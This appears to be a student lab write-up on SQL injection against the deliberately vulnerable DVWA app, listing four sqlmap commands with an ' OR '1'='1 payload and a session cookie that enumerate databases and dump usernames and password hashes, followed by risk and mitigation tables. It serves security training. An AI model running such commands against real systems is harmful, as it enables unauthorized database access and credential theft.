# SQL Injection Lab

## Objective
This lab demonstrates SQL injection testing and database enumeration using SQLMap against the deliberately vulnerable web application Damn Vulnerable Web Application(DVWA). The goal is to understand how attackers enumerate databases, retrieve table information, and extract sensitive data from insecure web applications..

## Tools Used
- Kali Linux (The attacck machine)
- SQLMap (SQL Injection automation)
- DVWA (A vulnerable test website)
- Browser (To access DVWA)

## Tasks Performed
- Tested web application for SQL injection
- Enumerated databases
- Listed tables and columns
- Extracted sample data

## Commands Used
```bash
i) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
--cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
--dbs
ii) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
--cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
-D dvwa --tables
iii) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
--cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
-D dvwa -T users --columns
iv) sqlmap -u "http://10.248.53.179/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit#" \
--cookie="PHPSESSID=8011a77cbbaec647230751c7774224e9; security=low" \
-D dvwa -T users -C user,password --dump

```

## Skills Demonstrated
- Web application security testing
- SQL injection detection
- Database enumeration
- Vulnerability assessment
- Table discovery
- Column extraction
- Data dumping
- Offensive security methodology


## Identification of Security Risks
| Vulnerability                | Risk                         |
| ---------------------------- | ---------------------------- |
| SQL Injection                | Unauthorized database access |
| Poor input validation        | Data leakage                 |
| Weak authentication handling | Session abuse                |
| Exposed database structure   | Information disclosure       |

## Mitigation Recommendations
| Mitigation                     | Purpose                     |
| ------------------------------ | --------------------------- |
| Prepared statements            | It prevents injection       |
| Parameterized queries          | Separates code from data    |
| Input validation               | Blocks malicious payloads   |
| Least privilege DB accounts    | It limits attacker impact   |
| Web Application Firewall (WAF) | Detects malicious requests  |
| Error handling                 | Prevents information leakage|




